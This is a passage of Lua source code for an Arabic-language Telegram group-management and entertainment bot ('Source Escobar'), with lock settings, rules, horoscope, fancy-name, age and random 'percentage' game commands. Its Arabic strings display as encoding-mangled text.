.."*β β« Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ β* "..lock_bots.."\n"
.."*β β« Ψ§ΩΩΨͺΨ­Ψ±ΩΩ β* "..mute_gifs.."\n"
.."*β β« Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ β* "..lock_sticker.."\n"
.."*β β« Ψ§ΩΩΩΩΨ§Ψͺ β* "..lock_file.."\n"
.."*β β« Ψ§ΩΨ΅ΩΨ± β* "..mute_photo.."\n"
.."*β β« Ψ§ΩΩΩΩΩ°Ψ―ΩΩ β* "..mute_video.."\n"
.."*β β« Ψ§ΩΨ§ΩΩΩΨ§ΩΩ β* "..mute_in.."\n"
.."*β β« Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω β* "..mute_text.."\n"
.."*β β« Ψ§ΩΨͺΩΨ¬ΩΩ β* "..lock_forward.."\n"
.."*β β« Ψ§ΩΨ§ΨΊΨ§ΩΩ β* "..mute_music.."\n"
.."*β β« Ψ§ΩΨ΅ΩΨͺ β* "..mute_voice.."\n"
.."*β β« Ψ§ΩΨ¬ΩΨ§Ψͺ β* "..lock_contact.."\n"
.."*β β« Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ β* "..markdown.."\n"
.."*β β« Ψ§ΩΩΨ§Ψ΄ΨͺΨ§Ω β* "..lock_htag.."\n"
.."*β β« Ψ§ΩΨͺΨΉΨ―ΩΩ β* "..mute_edit.."\n"
.."*β β« Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ β* "..lock_pin.."\n"
.."*β β« Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ β* "..lock_tgservice.."\n"
.."*β β« Ψ§ΩΩΩΨ§ΩΨ΄ β* "..lock_spam.."\n"
.."*β β« Ψ§ΩΨ―Ψ?ΩΩ β* "..lock_Join.."\n"
.."*β β« Ψ§ΩΨ΄Ψ¨ΩΨ§Ψͺ β* "..lock_wp.."\n"
.."*β β« Ψ§ΩΩΩΨ§ΩΨΉ β* "..lock_location.."\n"
.."*β β« Ψ§ΩΩΨ΄Ψ§Ψ± β* "..lock_fshar.."\n"
.."*β β« Ψ§ΩΩΩΨ± β* "..lock_kaf.."\n"
.."*β β« Ψ§ΩΨ·Ψ§Ψ¦ΩΩΩΩ°Ω β* "..lock_taf.."\n"
.."*β β« Ψ§ΩΨΉΨ±Ψ¨ΩΩ β* "..lock_arabic.."\n"
.."*β β« Ψ§ΩΨ§ΩΩΩΩΨ²ΩΩ β* "..lock_english.."\n"
.."*β β« Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ β* "..lock_farsi.."\n"
.."*β β« Ψ§ΩΨͺΩΨ±Ψ§Ψ± β* "..flood.."\n"
.."*β β« ΨΉΨ―Ψ― Ψ§ΩΨͺΩΨ±Ψ§Ψ± β* "..Flood_Num.."\n"
.."*β β« ΨΉΨ―Ψ― Ψ§ΩΨ³Ψ¨Ψ§Ω β* "..spam_c.."\n"
.."ββββ EB ββββ\nβ β« [πππππΎπ πππΎππ½πΌπ](https://t.me/TEAM_Escobar)\n"
Dev_mfm(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
end
end
--     Source Escobar     --
if text and text:match("^ΩΩΩ (.*)$") then
local txt = {string.match(text, "^(ΩΩΩ) (.*)$")}
Dev_mfm(msg.chat_id_,0, 1, txt[2], 1, 'md')
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if text and text:match("^Ψ§ΩΨ·Ω (.*)$") then
local UrlAntk = https.request('https://apiabs.ml/Antk.php?abs='..URL.escape(text:match("^Ψ§ΩΨ·Ω (.*)$")))
Antk = JSON.decode(UrlAntk)
if UrlAntk.ok ~= false then
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'β Escobar TeAM .',url="t.me/TEAM_Escobar"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendAudio?chat_id='..msg.chat_id_..'&audio='..URL.escape(Antk.result.link).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
--     Source Escobar     --
if Devmfm:get(mustafa..'mfm:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ ΩΩΨ§ΩΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
Devmfm:del(mustafa..'mfm:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
Devmfm:del(mustafa..'mfm:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:rules'..msg.chat_id_,text)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ ΩΩΨ§ΩΩΩ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')
return false   
end
if text and text:match("^ΨΆΨΉ ΩΩΨ§ΩΩΩ$") and ChCheck(msg) or text and text:match("^ΩΨΆΨΉ ΩΩΨ§ΩΩΩ$") and ChCheck(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ Ψ§ΩΩΩΨ§ΩΩΩ Ψ§ΩΨ§Ω', 1, 'md')
Devmfm:set(mustafa..'mfm:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^Ψ§ΩΩΩΨ§ΩΩΩ$") then
local rules = Devmfm:get(mustafa..'mfm:rules'..msg.chat_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
--     Source Escobar     --
if text == 'Ψ±ΩΩΩ' then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.phone_number_  then
MyNumber = "β β« Ψ±ΩΩΩ β« +"..result.phone_number_
else
MyNumber = "β β« ΨͺΩ ΩΨΆΨΉ Ψ±ΩΩΩ ΩΨ¬ΩΨ§Ψͺ Ψ§ΨͺΨ΅Ψ§ΩΩ ΩΩΨ·"
end
send(msg.chat_id_, msg.id_,MyNumber)
end,nil)
end
--     Source Escobar     --
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ²Ψ?Ψ±ΩΩ" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = '*β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β* '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ²Ψ?Ψ±ΩΩ Ψ¨ΩΨ¬Ψ§Ψ­'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Zrf:mfm'..msg.chat_id_) 
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ²Ψ?Ψ±ΩΩ" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = '*β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β* '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ²Ψ?Ψ±ΩΩ Ψ¨ΩΨ¬Ψ§Ψ­'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Zrf:mfm'..msg.chat_id_,true)  
end
if Devmfm:get(mustafa..'Zrf:mfm'..msg.chat_id_..''..msg.sender_user_id_) then 
if text and text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± Ψ§ΩΨ²Ψ?Ψ±ΩΩ', 1, 'md')
Devmfm:del(mustafa..'Zrf:mfm'..msg.chat_id_..''..msg.sender_user_id_)
return false  
end 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(text)) 
Zrf = JSON.decode(UrlZrf) 
t = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ²Ψ?ΩΩΰ’ͺΩΩΩΫ β β₯‘*\nββββ EB ββββ\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, t, 1, 'md')
Devmfm:del(mustafa..'Zrf:mfm'..msg.chat_id_..''..msg.sender_user_id_)
return false   
end
if not Devmfm:get(mustafa..'mfm:Zrf:mfm'..msg.chat_id_) then
if text == 'Ψ²Ψ?Ψ±ΩΩ' and ChCheck(msg) or text == 'Ψ§ΩΨ²Ψ?Ψ±ΩΩ' and ChCheck(msg) then  
Devmfm:setex(mustafa.."Zrf:mfm"..msg.chat_id_..""..msg.sender_user_id_,300,true)
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ Ψ§ΩΩΩΩΩ ΩΨ²Ψ?Ψ±ΩΨͺΩΨ§ *\n*ΩΩΩΩΩ Ψ§ΩΨ²Ψ?Ψ±ΩΨ© Ψ¨Ψ§ΩΩΨΊΩ { en } ~ { ar }* ', 1, 'md')
end
end
if not Devmfm:get(mustafa..'mfm:Zrf:mfm'..msg.chat_id_) then
if text and text:match("^Ψ²Ψ?Ψ±ΩΩ (.*)$") and ChCheck(msg) or text and text:match("^Ψ²Ψ?Ψ±Ω (.*)$") and ChCheck(msg) then 
local TextZrf = text:match("^Ψ²Ψ?Ψ±ΩΩ (.*)$") or text:match("^Ψ²Ψ?Ψ±Ω (.*)$") 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZrf)) 
Zrf = JSON.decode(UrlZrf) 
t = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ²Ψ?ΩΩΰ’ͺΩΩΩΫ β β₯‘*\nββββ EB ββββ\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, t, 1, 'md')
end
end
--     Source Escobar     --
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ¨Ψ±Ψ§Ψ¬" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = '*β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β* '..mfmRank(msg)..' \n*β β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ¨Ψ±Ψ§Ψ¬ Ψ¨ΩΨ¬Ψ§Ψ­*'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Brg:mfm'..msg.chat_id_) 
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ¨Ψ±Ψ§Ψ¬" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = '*β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β* '..mfmRank(msg)..' \n*β β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ¨Ψ±Ψ§Ψ¬ Ψ¨ΩΨ¬Ψ§Ψ­*'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Brg:mfm'..msg.chat_id_,true)  
end
if not Devmfm:get(mustafa..'mfm:Brg:mfm'..msg.chat_id_) then
if text and text:match("^Ψ¨Ψ±Ψ¬ (.*)$") and ChCheck(msg) or text and text:match("^Ψ¨Ψ±Ψ¬Ω (.*)$") and ChCheck(msg) then 
local TextBrg = text:match("^Ψ¨Ψ±Ψ¬ (.*)$") or text:match("^Ψ¨Ψ±Ψ¬Ω (.*)$") 
UrlBrg = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(TextBrg)) 
Brg = JSON.decode(UrlBrg) 
t = Brg.ok.mfm  
Dev_mfm(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source Escobar     --
if text and (text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ³Ψ¨" or text == "ΨͺΩΨΉΩΩ ΩΨ³Ψ¨Ω Ψ§ΩΨ­Ψ¨" or text == "ΨͺΩΨΉΩΩ ΩΨ³Ψ¨Ω Ψ§ΩΩΨ±Ω" or text == "ΨͺΩΨΉΩΩ ΩΨ³Ψ¨Ω Ψ§ΩΨ±Ψ¬ΩΩΩ" or text == "ΨͺΩΨΉΩΩ ΩΨ³Ψ¨Ω Ψ§ΩΨ§ΩΩΨ«Ω" or text == "ΨͺΩΨΉΩΩ ΩΨ³Ψ¨Ω Ψ§ΩΨΊΨ¨Ψ§Ψ‘") and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ³Ψ¨'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Nsba:mfm'..msg.chat_id_) 
end
if text and (text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ³Ψ¨" or text == "ΨͺΨΉΨ·ΩΩ ΩΨ³Ψ¨Ω Ψ§ΩΨ­Ψ¨" or text == "ΨͺΨΉΨ·ΩΩ ΩΨ³Ψ¨Ω Ψ§ΩΩΨ±Ω" or text == "ΨͺΨΉΨ·ΩΩ ΩΨ³Ψ¨Ω Ψ§ΩΨ±Ψ¬ΩΩΩ" or text == "ΨͺΨΉΨ·ΩΩ ΩΨ³Ψ¨Ω Ψ§ΩΨ§ΩΩΨ«Ω" or text == "ΨͺΨΉΨ·ΩΩ ΩΨ³Ψ¨Ω Ψ§ΩΨΊΨ¨Ψ§Ψ‘") and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ³Ψ¨'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Nsba:mfm'..msg.chat_id_,true)  
end
if not Devmfm:get(mustafa..'mfm:Nsba:mfm'..msg.chat_id_) then
if text == "ΩΨ³Ψ¨Ω Ψ§ΩΨ­Ψ¨" and ChCheck(msg) or text == "ΩΨ³Ψ¨Ψ© Ψ§ΩΨ­Ψ¨" and ChCheck(msg) then
Devmfm:set(mustafa..'LoveNsba:mfm'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩ Ψ¨Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§Ψ³ΩΩΩ ΩΨ­Ψ³Ψ§Ψ¨ ΩΨ³Ψ¨Ψ© Ψ§ΩΨ­Ψ¨ Ψ¨ΩΩΩΩΨ§ ΩΩΨ«Ψ§Ω β Ψ¬Ψ§Ω ΩΨ±ΩΨ²', 1, 'md')
end
end
if text and text ~= "ΩΨ³Ψ¨Ω Ψ§ΩΨ­Ψ¨" and text ~= "ΩΨ³Ψ¨Ψ© Ψ§ΩΨ­Ψ¨" and Devmfm:get(mustafa..'LoveNsba:mfm'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± ΩΨ³Ψ¨Ψ© Ψ§ΩΨ­Ψ¨ ', 1, 'md')
Devmfm:del(mustafa..'LoveNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
mfm = math.random(0,100);
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ³Ψ¨Ψ© Ψ§ΩΨ­Ψ¨ Ψ¨ΩΩ '..text..' ΩΩ : '..mfm..'%', 1, 'md')
Devmfm:del(mustafa..'LoveNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not Devmfm:get(mustafa..'mfm:Nsba:mfm'..msg.chat_id_) then
if text == "ΩΨ³Ψ¨Ω Ψ§ΩΩΨ±Ω" and ChCheck(msg) or text == "ΩΨ³Ψ¨Ψ© Ψ§ΩΩΨ±Ω" and ChCheck(msg) then
Devmfm:set(mustafa..'HataNsba:mfm'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩ Ψ¨Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§Ψ³ΩΩΩ ΩΨ­Ψ³Ψ§Ψ¨ ΩΨ³Ψ¨Ψ© Ψ§ΩΩΨ±Ω Ψ¨ΩΩΩΩΨ§ ΩΩΨ«Ψ§Ω β Ψ¬Ψ§Ω ΩΨ±ΩΨ²', 1, 'md')
end
end
if text and text ~= "ΩΨ³Ψ¨Ω Ψ§ΩΩΨ±Ω" and text ~= "ΩΨ³Ψ¨Ψ© Ψ§ΩΩΨ±Ω" and Devmfm:get(mustafa..'HataNsba:mfm'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± ΩΨ³Ψ¨Ψ© Ψ§ΩΩΨ±Ω ', 1, 'md')
Devmfm:del(mustafa..'HataNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
mfm = math.random(0,100);
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ³Ψ¨Ψ© Ψ§ΩΩΨ±Ω Ψ¨ΩΩ '..text..' ΩΩ : '..mfm..'%', 1, 'md')
Devmfm:del(mustafa..'HataNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not Devmfm:get(mustafa..'mfm:Nsba:mfm'..msg.chat_id_) then
if text and (text == "ΩΨ³Ψ¨Ω Ψ§ΩΨ±Ψ¬ΩΩΩ" or text == "ΩΨ³Ψ¨Ψ© Ψ§ΩΨ±Ψ¬ΩΩΩ" or text == "ΩΨ³Ψ¨Ω Ψ±Ψ¬ΩΩΩ" or text == "ΩΨ³Ψ¨Ψ© Ψ±Ψ¬ΩΩΩ") and ChCheck(msg) then
Devmfm:set(mustafa..'RjolaNsba:mfm'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩ Ψ¨Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§Ψ³Ω Ψ§ΩΨ΄Ψ?Ψ΅ ΩΩΩΨ§Ψ³ ΩΨ³Ψ¨Ψ© Ψ±Ψ¬ΩΩΨͺΩ ΩΩΨ«Ψ§Ω β Ψ¬Ψ§Ω', 1, 'md')
end
end
if text and text ~= "ΩΨ³Ψ¨Ω Ψ§ΩΨ±Ψ¬ΩΩΩ" and text ~= "ΩΨ³Ψ¨Ψ© Ψ§ΩΨ±Ψ¬ΩΩΩ" and text ~= "ΩΨ³Ψ¨Ω Ψ±Ψ¬ΩΩΩ" and text ~= "ΩΨ³Ψ¨Ψ© Ψ±Ψ¬ΩΩΩ" and Devmfm:get(mustafa..'RjolaNsba:mfm'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± ΩΨ³Ψ¨Ψ© Ψ§ΩΨ±Ψ¬ΩΩΩ ', 1, 'md')
Devmfm:del(mustafa..'RjolaNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
mfm = math.random(0,100);
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ³Ψ¨Ψ© Ψ±Ψ¬ΩΩΨ© '..text..' ΩΩ : '..mfm..'%', 1, 'md')
Devmfm:del(mustafa..'RjolaNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not Devmfm:get(mustafa..'mfm:Nsba:mfm'..msg.chat_id_) then
if text and (text == "ΩΨ³Ψ¨Ω Ψ§ΩΨ§ΩΩΨ«Ω" or text == "ΩΨ³Ψ¨Ψ© Ψ§ΩΨ§ΩΩΨ«Ω" or text == "ΩΨ³Ψ¨Ω Ψ§ΩΩΨ«Ω" or text == "ΩΨ³Ψ¨Ψ© Ψ§ΩΩΨ«Ω") and ChCheck(msg) then
Devmfm:set(mustafa..'AnothaNsba:mfm'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩ Ψ¨Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§Ψ³Ω Ψ§ΩΨ΄Ψ?Ψ΅ ΩΩΩΨ§Ψ³ ΩΨ³Ψ¨Ψ© Ψ§ΩΩΨ«ΨͺΩ ΩΩΨ«Ψ§Ω β Ψ±ΩΨ²', 1, 'md')
end
end
if text and text ~= "ΩΨ³Ψ¨Ω Ψ§ΩΨ§ΩΩΨ«Ω" and text ~= "ΩΨ³Ψ¨Ψ© Ψ§ΩΨ§ΩΩΨ«Ω" and text ~= "ΩΨ³Ψ¨Ω Ψ§ΩΩΨ«Ω" and text ~= "ΩΨ³Ψ¨Ψ© Ψ§ΩΩΨ«Ω" and Devmfm:get(mustafa..'AnothaNsba:mfm'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± ΩΨ³Ψ¨Ψ© Ψ§ΩΨ§ΩΩΨ«Ω ', 1, 'md')
Devmfm:del(mustafa..'AnothaNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
mfm = math.random(0,100);
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ³Ψ¨Ψ© Ψ§ΩΩΨ«Ψ© '..text..' ΩΩ : '..mfm..'%', 1, 'md')
Devmfm:del(mustafa..'AnothaNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not Devmfm:get(mustafa..'mfm:Nsba:mfm'..msg.chat_id_) then
if text and (text == "ΩΨ³Ψ¨Ω Ψ§ΩΨΊΨ¨Ψ§Ψ‘" or text == "ΩΨ³Ψ¨Ψ© Ψ§ΩΨΊΨ¨Ψ§Ψ‘") and ChCheck(msg) then
Devmfm:set(mustafa..'StupidNsba:mfm'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩ Ψ¨Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§Ψ³Ω Ψ§ΩΨ΄Ψ?Ψ΅ ΩΩΩΨ§Ψ³ ΩΨ³Ψ¨Ψ© ΨΊΨ¨Ψ§Ψ¦Ω ΩΩΨ«Ψ§Ω β Ψ¬Ψ§Ω Ψ§Ω Ψ±ΩΨ²', 1, 'md')
end
end
if text and text ~= "ΩΨ³Ψ¨Ω Ψ§ΩΨΊΨ¨Ψ§Ψ‘" and text ~= "ΩΨ³Ψ¨Ψ© Ψ§ΩΨΊΨ¨Ψ§Ψ‘" and Devmfm:get(mustafa..'StupidNsba:mfm'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± ΩΨ³Ψ¨Ψ© Ψ§ΩΨΊΨ¨Ψ§Ψ‘ ', 1, 'md')
Devmfm:del(mustafa..'StupidNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
mfm = math.random(0,100);
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ³Ψ¨Ψ© ΨΊΨ¨Ψ§Ψ‘ '..text..' ΩΩ : '..mfm..'%', 1, 'md')
Devmfm:del(mustafa..'StupidNsba:mfm'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
--     Source Escobar     --
if text == "ΨͺΩΨΉΩΩ Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ±" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ±'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Age:mfm'..msg.chat_id_) 
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ±" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ±'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Age:mfm'..msg.chat_id_,true)  
end
if not Devmfm:get(mustafa..'mfm:Age:mfm'..msg.chat_id_) then
if text and text:match("^Ψ§Ψ­Ψ³Ψ¨ (.*)$") and ChCheck(msg) or text and text:match("^ΨΉΩΨ±Ω (.*)$") and ChCheck(msg) then 
local TextAge = text:match("^Ψ§Ψ­Ψ³Ψ¨ (.*)$") or text:match("^ΨΉΩΨ±Ω (.*)$") 
UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
Age = JSON.decode(UrlAge) 
t = Age.ok.mfm
Dev_mfm(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source Escobar     --
if text == "ΨͺΩΨΉΩΩ ΩΨΉΨ§ΩΩ Ψ§ΩΨ§Ψ³ΩΨ§Ψ‘" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ ΩΨΉΨ§ΩΩ Ψ§ΩΨ§Ψ³ΩΨ§Ψ‘'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Mean:mfm'..msg.chat_id_) 
end
if text == "ΨͺΨΉΨ·ΩΩ ΩΨΉΨ§ΩΩ Ψ§ΩΨ§Ψ³ΩΨ§Ψ‘" and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ ΩΨΉΨ§ΩΩ Ψ§ΩΨ§Ψ³ΩΨ§Ψ‘'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Mean:mfm'..msg.chat_id_,true)  
end
if not Devmfm:get(mustafa..'mfm:Mean:mfm'..msg.chat_id_) then
if text and text:match("^ΩΨΉΩΩ Ψ§ΩΨ§Ψ³Ω (.*)$") and ChCheck(msg) or text and text:match("^ΩΨΉΩΩ Ψ§Ψ³Ω (.*)$") and ChCheck(msg) then 
local TextMean = text:match("^ΩΨΉΩΩ Ψ§ΩΨ§Ψ³Ω (.*)$") or text:match("^ΩΨΉΩΩ Ψ§Ψ³Ω (.*)$") 
UrlMean = https.request('https://apiabs.ml/Mean.php?Abs='..URL.escape(TextMean)) 
Mean = JSON.decode(UrlMean) 
t = Mean.ok.mfm
